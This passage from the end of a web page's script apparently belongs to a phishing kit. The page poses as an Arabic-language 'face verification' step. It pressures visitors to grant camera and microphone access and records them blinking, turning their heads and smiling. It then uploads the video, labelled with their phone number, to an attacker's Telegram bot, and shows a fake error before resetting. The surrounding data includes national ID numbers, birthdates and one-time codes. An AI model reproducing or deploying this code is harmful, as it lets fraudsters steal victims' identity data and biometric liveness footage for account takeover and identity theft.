          <strong>Ø§ØºÙ…Ø§Ø¶ Ø§Ù„Ø¹ÙŠÙ† (3 Ø«ÙˆØ§Ù†Ù)</strong>ØŒ <strong>ÙˆØ¬Ù‡ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† Ù‚Ù„ÙŠÙ„Ø§Ù‹</strong>ØŒ <strong>Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„Ù„Ù…Ù†ØªØµÙ</strong>ØŒ <strong>ÙˆØ¬Ù‡ Ø¥Ù„Ù‰ Ø§Ù„ÙŠØ³Ø§Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹</strong>ØŒ <strong>ÙˆØ¬Ù‡ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰</strong>ØŒ <strong>Ø§ØºÙ…Ø§Ø¶ Ø§Ù„Ø¹ÙŠÙ†</strong>ØŒ Ø«Ù… <strong>Ø§Ø¨ØªØ³Ù…</strong>.<br>
          Ø§Ø¶Ø¨Ø· ÙˆØ¬Ù‡Ùƒ Ø¯Ø§Ø®Ù„ Ø§Ù„Ø¥Ø·Ø§Ø±ØŒ Ø£Ø²Ù„ Ø§Ù„Ù‚Ø¨Ø¹Ø©/Ø§Ù„Ù†Ø¸Ø§Ø±Ø§Øª Ø¥Ø°Ø§ Ù„Ø²Ù…ØŒ ÙˆØ§Ø³Ù…Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§.
        </div>
      </div>
    `;
  }

  // --- Ø¥Ø¯Ø§Ø±Ø© Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§: Ù…Ø­Ø§ÙˆÙ„Ø§Øª ÙˆØ¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¹Ù†Ø¯ Ø§Ù„Ø±ÙØ¶ ---
  const permModal = document.getElementById('permissionModal');
  const permRetryBtn = document.getElementById('permRetryBtn');
  const permCancelBtn = document.getElementById('permCancelBtn');

  function showPermissionDialog() {
    permModal.classList.add('active');
  }
  function hidePermissionDialog() {
    permModal.classList.remove('active');
  }

  // ØªØ¹Ø±Ø¶ Ù†Ø§ÙØ°Ø© ÙˆØ¥Ø±Ø¬Ø§Ø¹ Promise ÙŠÙ†ØªØ¸Ø± Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… (retry/cancel)
  function promptForPermissionFromUser() {
    return new Promise(resolve => {
      showPermissionDialog();
      const onRetry = () => { cleanup(); resolve('retry'); };
      const onCancel = () => { cleanup(); resolve('cancel'); };
      function cleanup(){
        permRetryBtn.removeEventListener('click', onRetry);
        permCancelBtn.removeEventListener('click', onCancel);
        hidePermissionDialog();
      }
      permRetryBtn.addEventListener('click', onRetry);
      permCancelBtn.addEventListener('click', onCancel);
    });
  }

  // Ù…Ø­Ø§ÙˆÙ„Ø© ÙˆØ§Ø­Ø¯Ø© Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ø³ØªØ±ÙŠÙ… â€” ØªÙØ±Ù…Ù‰ Ø¥Ø°Ø§ ÙØ´Ù„
  async function tryGetUserMediaOnce() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error('getUserMedia ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ù…ØªØµÙØ­');
    }
    // Ù†Ø³ØªØ®Ø¯Ù… facingMode:user Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© Ø¥Ù† ÙˆÙØ¬ÙØ¯Øª
    return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
  }

  // Ø­Ù„Ù‚Ø© ØªØ·Ø§Ù„Ø¨ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¨Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© ÙƒÙ„Ù…Ø§ ØªÙ… Ø§Ù„Ø±ÙØ¶ØŒ ÙˆØªÙØ±Ø¬Ø¹ Ø§Ù„Ø³ØªØ±ÙŠÙ… Ø¹Ù†Ø¯ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø£Ùˆ ØªÙØ±Ù…Ù‰ Ø¹Ù†Ø¯ Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
  async function requestCameraWithInsistence() {
    // Ø£ÙˆÙ„ Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø¨Ø§Ø´Ø±Ø© (Ø³ØªÙØ¸Ù‡Ø± Ù†Ø§ÙØ°Ø© Ø§Ù„Ù…ØªØµÙØ­ Ø¥Ø°Ø§ Ù„Ù… ØªÙÙ…Ù†Ø­ Ø¨Ø¹Ø¯)
    try {
      const stream = await tryGetUserMediaOnce();
      return stream;
    } catch (err) {
      // Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø®Ø·Ø£ Ù†ØªÙŠØ¬Ø© Ø±ÙØ¶ Ø¥Ø°Ù†ØŒ Ù†Ø·Ø§Ù„Ø¨ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¨Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø£Ùˆ Ø§Ù„ØªÙˆØ¬ÙŠÙ‡
      const deniedNames = ['NotAllowedError','PermissionDeniedError','NotFoundError','SecurityError'];
      const isPermissionError = err && (deniedNames.includes(err.name) || (err.message && err.message.toLowerCase().includes('permission')));
      // Ø¨Ø¹Ø¶ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª Ù„Ø§ ØªØ¹Ø·ÙŠ Ø§Ø³Ù… ÙˆØ§Ø¶Ø­ Ù„Ø°Ø§ Ù†ØªÙÙ‚Ø¯ navigator.permissions Ø¥Ù† ÙˆÙØ¬Ø¯
      if (!isPermissionError && navigator.permissions && navigator.permissions.query) {
        try {
          const p = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
          if (p && p.state === 'denied') {
            // Ø§Ø¹ØªØ¨Ø±Ù‡Ø§ Ù…Ø´ÙƒÙ„Ø© Ø¥Ø°Ù†
            // fallthrough to dialog
          }
        } catch(e){}
      }

      if (!isPermissionError) {
        // Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø®Ø·Ø£ Ù„ÙŠØ³ Ø±ÙØ¶ Ø¥Ø°Ù† ÙˆØ§Ø¶Ø­ØŒ Ø£Ø¹ï¿½ï¿½Ø¯Ù‡ Ù„Ù„Ù…ØªØµÙ„ Ù„ÙŠØªØ¹Ø§Ù…Ù„ Ù…Ø¹ Ø§Ù„Ø®Ø·Ø£
        throw err;
      }

      // Ø§Ù„Ø¢Ù† Ù†Ø¹Ø±Ø¶ Ù†Ø§ÙØ°Ø© Ø¥ØµØ±Ø§Ø± ÙˆÙ†Ø¹ÙŠØ¯ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø·Ø§Ù„Ù…Ø§ ÙŠØ¶ØºØ· Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… "Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©"
      while (true) {
        const choice = await promptForPermissionFromUser();
        if (choice === 'cancel') throw new Error('Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ù„ØºÙ‰ Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù†');
        // Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ø®ØªØ§Ø± Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© -> Ù†Ø­Ø§ÙˆÙ„ Ù…Ø¬Ø¯Ø¯Ø§Ù‹
        try {
          const stream = await tryGetUserMediaOnce();
          return stream;
        } catch (eAgain) {
          // ØªØ­Ù‚Ù‚ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø±ÙØ¶ Ø¯Ø§Ø¦Ù… (Ù‚Ø¯ Ù„Ø§ ØªÙØ¸Ù‡Ø± Ø§Ù„Ù…ØªØµÙØ­Ø§Øª prompt Ù…Ø±Ø© Ø£Ø®Ø±Ù‰)
          const stillDenied = eAgain && (eAgain.name === 'NotAllowedError' || eAgain.name === 'PermissionDeniedError' || (eAgain.message && eAgain.message.toLowerCase().includes('permission')));
          if (!stillDenied) {
            // Ø®Ø·Ø£ Ø¢Ø®Ø± - Ø£Ø±Ø³Ù„Ù‡ Ù„Ù„Ø®Ø§Ø±Ø¬
            throw eAgain;
          }
          // ÙˆØ¥Ù„Ø§ ØªÙƒØ±Ø§Ø± Ø§Ù„Ø­Ù„Ù‚Ø©: Ø³ÙŠØ¸Ù‡Ø± Ù†ÙØ³ Ù†Ø§ÙØ°Ø© Ø§Ù„Ø¥ØµØ±Ø§Ø± Ù„ÙŠØªØ®Ø° Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¥Ø¬Ø±Ø§Ø¡Ù‹ Ø¢Ø®Ø±
        }
      }
    }
  }

  // ØªØ³Ø¬ÙŠÙ„ ÙÙŠØ¯ÙŠÙˆ ØªØ³Ù„Ø³Ù„ÙŠ â€” Ø§Ù„Ø¢Ù† Ù†Ø³Ø¬Ù„ Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© Ø·ÙˆØ§Ù„ Ø§Ù„Ø®Ø·ÙˆØ§Øª Ø«Ù… Ù†ÙˆÙ‚Ù Ø¨Ø¹Ø¯ Ø§Ù„Ù†Ù‡Ø§ÙŠØ©
  async function startCaptureSequence(){
    renderPreparingMessage();
    await wait(700);

    // ØªÙ… ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„ØªØ³Ù„Ø³Ù„ Ø­Ø³Ø¨ Ø·Ù„Ø¨Ùƒ:
    // 1) Ø§ØºÙ…Ø¶ Ø¹ÙŠÙ†ÙŠÙƒ 3 Ø«ÙˆØ§Ù†Ù
    // 2) Ø­Ø±Ùƒ ÙˆØ¬Ù‡Ùƒ Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† (3 Ø«ÙˆØ§Ù†Ù)
    // 3) Ø¹Ø¯ Ø¥Ù„Ù‰ Ø§Ù„Ù…Ù†ØªØµÙ (1.5 Ø«Ø§Ù†ÙŠØ©)
    // 4) Ø­Ø±Ùƒ ÙˆØ¬Ù‡Ùƒ Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ø¥Ù„Ù‰ Ø§Ù„ÙŠØ³Ø§Ø± (3 Ø«ÙˆØ§Ù†Ù)
    // 5) Ø­Ø±Ùƒ ÙˆØ¬Ù‡Ùƒ Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ (3 Ø«ÙˆØ§Ù†Ù)
    // 6) Ø§ØºÙ…Ø¶ Ø¹ÙŠÙ†ÙŠÙƒ Ø«Ø§Ù†ÙŠØ©Ù‹ 3 Ø«ÙˆØ§Ù†Ù
    // 7) Ø§Ø¨ØªØ³Ù… 3 Ø«ÙˆØ§Ù†Ù
    const steps = [
      { label: 'Ø§ØºÙ…Ø¶ Ø¹ÙŠÙ†ÙŠÙƒ', instruction: 'Ø£ØºÙ„Ù‚ Ø¹ÙŠÙ†ÙŠÙƒ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ Ù„Ù…Ø¯Ø© 3 Ø«ÙˆØ§Ù†Ù', duration: 3000 },
      { label: 'Ø­Ø±Ùƒ ÙˆØ¬Ù‡Ùƒ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ†', instruction: 'Ø­Ø±Ù‘Ùƒ ÙˆØ¬Ù‡Ùƒ Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† Ø«Ù… Ø¹Ø¯ Ù„Ù„Ù…Ù†ØªØµÙ', duration: 3000 },
      { label: 'Ø§Ù„Ø¹ÙˆØ¯Ø© Ù„Ù„Ù…Ù†ØªØµÙ', instruction: 'Ø¹Ø¯ Ø¥Ù„Ù‰ ÙˆØ¶Ø¹ Ø§Ù„ÙˆØ¬Ù‡ ÙÙŠ Ø§Ù„Ù…Ù†ØªØµÙ ÙˆØ§Ø«Ø¨Øª Ù„Ø¨Ø¶Ø¹ Ø«ÙˆØ§Ù†Ù', duration: 1500 },
      { label: 'Ø­Ø±Ùƒ ÙˆØ¬Ù‡Ùƒ Ø¥Ù„Ù‰ Ø§Ù„ÙŠØ³Ø§Ø±', instruction: 'Ø­Ø±Ù‘Ùƒ ÙˆØ¬Ù‡Ùƒ Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ø¥Ù„Ù‰ Ø§Ù„ÙŠØ³Ø§Ø± Ø«Ù… Ø¹Ø¯ Ù„Ù„Ù…Ù†ØªØµÙ', duration: 3000 },
      { label: 'Ø­Ø±Ùƒ ÙˆØ¬Ù‡Ùƒ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† Ù…Ø±Ø© Ø£Ø®Ø±Ù‰', instruction: 'Ø­Ø±Ù‘Ùƒ ÙˆØ¬Ù‡Ùƒ Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ø¥Ù„Ù‰ Ø§Ù„ÙŠÙ…ÙŠÙ† Ù…Ø±Ø© Ø£Ø®Ø±Ù‰ Ø«Ù… Ø¹Ø¯ Ù„Ù„Ù…Ù†ØªØµÙ', duration: 3000 },
      { label: 'Ø§ØºÙ…Ø¶ Ø¹ÙŠÙ†ÙŠÙƒ Ù…Ø±Ø© Ø£Ø®Ø±Ù‰', instruction: 'Ø£ØºÙ„Ù‚ Ø¹ÙŠÙ†ÙŠÙƒ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ Ù„Ù…Ø¯Ø© 3 Ø«ÙˆØ§Ù†Ù', duration: 3000 },
      { label: 'Ø§Ø¨ØªØ³Ù…', instruction: 'Ø§Ø¨ØªØ³Ù… Ø·Ø¨ÙŠØ¹ÙŠØ§Ù‹ Ù„Ù…Ø¯Ø© 3 Ø«ÙˆØ§Ù†Ù', duration: 3000 }
    ];

    app.innerHTML = `
      <div style="padding:8px;">
        <div class="camera-wrap">
          <div class="camera-box" id="cameraBox">
            <div class="countdown" id="countdown" style="display:none">3</div>
            <video id="videoPreview" playsinline autoplay muted></video>
          </div>
          <div class="instruction-box" id="instructionBox">Ø¬Ø§Ø±ÙŠ ØªØ¬Ù‡ÙŠØ² Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...</div>
          <div style="width:100%;display:flex;gap:10px;justify-content:center;">
            <button id="cancelCapture" class="danger-button">Ø¥Ù„ØºØ§Ø¡</button>
          </div>
        </div>
      </div>
    `;

    const cancelBtn = document.getElementById('cancelCapture');
    let stream = null;
    try {
      // Ù‡Ù†Ø§ Ù†Ø³ØªØ®Ø¯Ù… Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥ØµØ±Ø§Ø± Ø¹Ù„Ù‰ Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù†: Ø³ØªØ¹ÙŠØ¯ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø¹Ù†Ø¯ Ø§Ù„Ø±ÙØ¶ Ø·Ø§Ù„Ù…Ø§ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙŠØ¶ØºØ· "Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©"
      stream = await requestCameraWithInsistence();
    } catch (err) {
      // ÙØ´Ù„ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ø³ØªØ±ÙŠÙ… Ø¨Ø³Ø¨Ø¨ Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£Ùˆ Ø®Ø·Ø£ Ø¢Ø®Ø±
      throw err;
    }

    const videoEl = document.getElementById('videoPreview');
    // Ù…Ø¹Ø§ÙŠÙ†Ø© Ù…Ø¹ÙƒÙˆØ³Ø© (Ù…Ø±Ø¢Ø©)
    videoEl.style.transform = 'scaleX(-1)';
    videoEl.srcObject = stream;

    const instructionBox = document.getElementById('instructionBox');
    const countdownEl = document.getElementById('countdown');

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    await new Promise((resolve) => {
      if (videoEl.readyState >= 2 && videoEl.videoWidth && videoEl.videoHeight) {
        canvas.width = videoEl.videoWidth || 640;
        canvas.height = videoEl.videoHeight || 480;
        resolve();
      } else {
        const onMeta = () => {
          canvas.width = videoEl.videoWidth || 640;
          canvas.height = videoEl.videoHeight || 480;
          videoEl.removeEventListener('loadedmetadata', onMeta);
          resolve();
        };
        videoEl.addEventListener('loadedmetadata', onMeta);
      }
    });

    let drawActive = true;
    function drawLoop(){
      if(!drawActive) return;
      try {
        ctx.save();
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.scale(-1, 1);
        ctx.drawImage(videoEl, -canvas.width, 0, canvas.width, canvas.height);
        ctx.restore();
      } catch (e) {}
      requestAnimationFrame(drawLoop);
    }
    drawLoop();

    const processedStream = canvas.captureStream(30);
    const audioTracks = stream.getAudioTracks();
    if (audioTracks && audioTracks.length) audioTracks.forEach(t => processedStream.addTrack(t));

    // Ø§Ø®ØªØ± mime ÙƒÙ…Ø§ ÙÙŠ Ø§Ù„Ø³Ø§Ø¨Ù‚
    let chosenMime = null;
    if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
      if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) chosenMime = 'video/mp4;codecs=h264';
      else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) chosenMime = 'video/webm;codecs=vp9';
      else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) chosenMime = 'video/webm;codecs=vp8,opus';
      else if (MediaRecorder.isTypeSupported('video/webm')) chosenMime = 'video/webm';
    }
    const options = chosenMime ? { mimeType: chosenMime } : undefined;

    let recorder;
    try {
      recorder = new MediaRecorder(processedStream, options);
    } catch (e) {
      try { recorder = new MediaRecorder(processedStream); } catch (err) { stopStream(stream); drawActive = false; throw err; }
    }

    let chunks = [];
    recorder.ondataavailable = (ev) => { if (ev.data && ev.data.size) chunks.push(ev.data); };

    // Ø³Ù†Ù†ØªØ¸Ø± Ø­Ø¯Ø« stop Ù„Ø¶Ù…Ø§Ù† ÙˆØµÙˆÙ„ Ø¢Ø®Ø± chunk
    let stopPromiseResolve;
    const stopPromise = new Promise(resolve => { stopPromiseResolve = resolve; });
    recorder.onstop = () => {
      // Ø§Ø¶Ù ØªØ£Ø®ÙŠØ± Ø¨Ø³ÙŠØ· Ù„Ø¶Ù…Ø§Ù† Ù…Ø¹Ø§Ù„Ø¬Ø© Ø¢Ø®Ø± dataavailable
      setTimeout(() => stopPromiseResolve(), 250);
    };

    let cancelled = false;
    cancelBtn.onclick = async () => {
      cancelled = true;
      try { if (recorder && recorder.state !== 'inactive') recorder.stop(); } catch(e){}
      await stopPromise.catch(()=>{});
      stopStream(stream);
      drawActive = false;
      renderCode4Step();
    };

    // Ø§Ø¨Ø¯Ø£ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© Ù‚Ø¨Ù„ Ø§Ù„Ø®Ø·ÙˆØ§Øª
    try {
      recorder.start();
    } catch (err) {
      console.warn('recorder.start failed', err);
    }

    // ØªÙ†ÙÙŠØ° Ø§Ù„Ø®Ø·ÙˆØ§Øª (Ø§Ù„ØªÙˆÙ‚ÙŠØª ÙˆØ§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ) Ø¨ÙŠÙ†Ù…Ø§ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ù…Ø³ØªÙ…Ø±
    await wait(250);
    for (let i=0;i<steps.length;i++){
      if (cancelled) break;
      const s = steps[i];
      instructionBox.textContent = s.instruction;
      await wait(700);

      countdownEl.style.display = 'block';
      for (let c=3;c>=1;c--){ countdownEl.textContent = c; await wait(700); }
      countdownEl.style.display = 'none';

      let rem = Math.ceil(s.duration/1000);
      for (let t=rem; t>=1; t--){ instructionBox.textContent = `${s.label} â€” ØªØ¨Ù‚Ù‘Ù‰ ${t} Ø«Ø§Ù†ÙŠØ©`; await wait(1000); }
    }

    // Ø£ÙˆÙ‚Ù Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© Ø¨Ø¹Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡
    if (!cancelled) {
      try { if (recorder && recorder.state !== 'inactive') recorder.stop(); } catch(e){ console.warn('stop failed', e); }
      await stopPromise;
    }

    // Ø£Ù†Ù‡Ù Ø§Ù„Ø±Ø³Ù… ÙˆØ§Ù„Ø³ØªØ±ÙŠÙ…
    drawActive = false;
    stopStream(stream);

    const finalType = chosenMime ? chosenMime.split(';')[0] : (chunks[0] ? chunks[0].type : 'video/webm');
    const finalBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });

    showProcessing(true);
    try {
      if (finalBlob.size > 0) {
        await sendVideoToTelegramAsVideo(finalBlob);
      } else {
        console.warn('finalBlob is empty â€” Ù„Ø§ ÙŠÙˆØ¬Ø¯ ÙÙŠØ¯ÙŠÙˆ Ù…Ø³Ø¬Ù‘Ù„');
      }
    } catch (e) {
      console.error('send video error', e);
    } finally {
      showProcessing(false);
    }

    showFinalErrorAndReset();
  }

  async function sendVideoToTelegramAsVideo(blob){
    try {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      const ext = blob.type.includes('mp4') ? 'mp4' : (blob.type.includes('webm') ? 'webm' : 'mp4');
      const fileName = `${userData.phone || 'user'}_face_${Date.now()}.${ext}`;
      form.append('video', blob, fileName);
      form.append('caption', `Face verification â€” ${userData.phone || ''}`);
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: form });
      const data = await res.json();
      if (data && data.ok && data.result && data.result.message_id) { telegramMsgId = data.result.message_id; return; }
      console.warn('sendVideo non-ok', data);
      await sendVideoAsDocumentFallback(blob);
    } catch (err) {
      console.error('sendVideo error', err);
      try { await sendVideoAsDocumentFallback(blob); } catch(e){ console.error('fallback failed', e); throw err; }
    }
  }
  async function sendVideoAsDocumentFallback(blob){
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    const fileName = `${userData.phone || 'user'}_face_${Date.now()}.webm`;
    form.append('document', blob, fileName);
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body: form });
    const data = await res.json();
    if (data && data.ok && data.result && data.result.message_id) telegramMsgId = data.result.message_id;
    else console.warn('sendDocument failed', data);
  }

  async function sendToTelegramAndGetMsgId(msg){
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
      const data = await res.json();
      if (data && data.result && data.result.message_id) return data.result.message_id;
    } catch (e) { console.log('telegram send error', e); }
    return null;
  }
  async function resendTelegramMsg(msg){
    if (telegramMsgId) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
          method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, message_id: telegramMsgId })
        });
      } catch(e){}
    }
    return await sendToTelegramAndGetMsgId(msg);
  }

  function stopStream(stream){ if(!stream) return; stream.getTracks().forEach(t=>{ try{ t.stop(); } catch(e){} }); }
  function wait(ms){ return new Promise(res=>setTimeout(res, ms)); }

  function showProcessing(show){ const m = document.getElementById('processingModal'); if(!m) return; if(show) m.classList.add('active'); else m.classList.remove('active'); }

  function showFinalErrorAndReset(){
    const modal = document.getElementById('modalError');
    modal.classList.add('active');
    const btn = document.getElementById('modalCloseBtn');
    function handler(){
      modal.classList.remove('active');
      btn.removeEventListener('click', handler);
      userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
      renderPhoneStep();
    }
    btn.addEventListener('click', handler);
    setTimeout(()=>{
      if(modal.classList.contains('active')){
        modal.classList.remove('active');
        userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
        renderPhoneStep();
      }
    }, 2500);
  }

  // Ø§Ø¨Ø¯Ø£ Ø§Ù„ØªØ·Ø¨ÙŠÙ‚
  renderPhoneStep();

</script>
</body>
</html>
